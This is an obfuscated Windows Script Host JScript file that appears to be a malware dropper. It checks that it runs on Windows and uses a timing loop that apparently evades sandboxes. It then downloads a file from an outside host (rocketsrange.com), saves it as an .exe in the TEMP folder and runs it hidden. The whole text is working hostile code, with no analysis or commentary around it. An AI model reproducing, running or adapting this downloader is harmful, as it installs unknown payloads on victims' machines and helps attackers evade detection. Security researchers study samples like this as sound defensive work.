var _WZ0 = false;
var _WY = "CreateObject";
var _ZE = function _EP() {return WScript[_WY]("WScript"+".Shell");}(), _B0 = 11;
var _FY = "MSXML2.XMLHTTP";
var _Q = 2123213;
var _W = 0;
function _BR(_K){_ZE["Run"](_K, _W, _W);};
function _PV(){return _FY + "";};
function _YP(_B1, _AH){_W = _W * 1; return _B1 - _AH;};
function _E(){return _WY;};
/*@cc_on
  @if (@_win32 || @_win64)
    _WZ0 = true;
  @end
@*/
if (_WZ0)
{
var _AT = "";
function _J(){return 22;};
var _D = 0; var _FG = 0;
function _BE()
{
var _NU = new this["Date"]();
var _VN = _NU["getUTCMilliseconds"]();
WScript["Sleep"](_J());
var _NU = new this["Date"]();
var _AY = _NU["getUTCMilliseconds"]();
WScript["Sleep"](_J());
var _NU = new this["Date"]();
var _CK = _NU["getUTCMilliseconds"]();
var _D = "_VM";
_D = _YP(_AY, _VN);
var _FG = "_VY";
_FG = _YP(_CK, _AY);
_AT = "open";
return _YP(_D, _FG);
}
var _GK = false;
var _XI = false;
for (var _B = _W; _B < _J() * 1; _B++){if (_BE() != _W){
_GK = true; 
_FG = "31" + 11 * _D + _FG; 
_XI = true; 
break;
}}
function _Y() {return ((_GK == true) && (_GK == _XI)) ? 1 : _W;};
if (_GK && _Y() && _XI){
function _YD() {return _ZE["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "1YiXtFK70ewWIsf.ex" + "e";};
 _H0 = _PV();
 _H = WScript[_WY](_H0);
 var _FA = 1;
 while (_FA){
try {
	if (_FA == 1)
	{
		_H[_AT]("GET", "http://rocketsrange.com/b5ksa", false);
		_H["send"]();
		_WZ = "Sleep";
	}
	WScript[_WZ](_J() + 120); 
	if (_H["readystate"] < 2 * 2) continue;
	_FA = _W;
	function _L(_I) {var _EB = (1, 2, 3, 4, 5, _I); return _EB;};
	_F0 = WScript[_E()]("ADODB.Stream");
	_H0 = _F0;
	_H0[_AT]();
	_H0["type"] = _L(1);
	_H0["write"](_H["ResponseBody"]);
	_F0["position"] = _L(_W);
	_H0["Save" + "ToFile"](_YD(), 2);
	_F0["cl"+"ose"]();
	_UN = _YD();
	_BR(_UN);
} catch(_F){};
}
}
}

